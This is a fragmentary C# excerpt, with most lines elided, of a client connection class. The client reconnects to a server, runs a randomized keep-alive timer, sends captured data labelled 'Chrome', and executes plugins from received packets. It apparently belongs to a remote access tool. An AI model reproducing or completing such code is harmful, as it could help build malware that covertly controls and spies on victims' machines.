...
namespace Client.Connection
{
    public static class ClientSocket
    {
        ...
        public static void InitializeClient() //Connect & reconnect
        {
            try
            {
                ...
                if (TcpClient.Connected)
                {
                    ...
                    Offset = 0;
                    ActivatePong = false;
                    KeepAlive = new Timer(new TimerCallback(CheckServer), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    ...
                    {
                        Packet.IsOk = true;
                        Packet.CaptureAndSend(30, "Chrome");
                    }).Start();
                }
                else
                {
                ...
                if (recevied > 0)
                {
                    ...
                    if (HeaderSize == 0)
                    {
                        ...
                        if (HeaderSize > 0)
                        {
                            ...
                            Thread thread = new Thread(new ParameterizedThreadStart(Plugin.Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
        ...
        public static void ReportError(String Error)
        {
            ...
            msgpack.ForcePathObject("Error").AsString = Error;
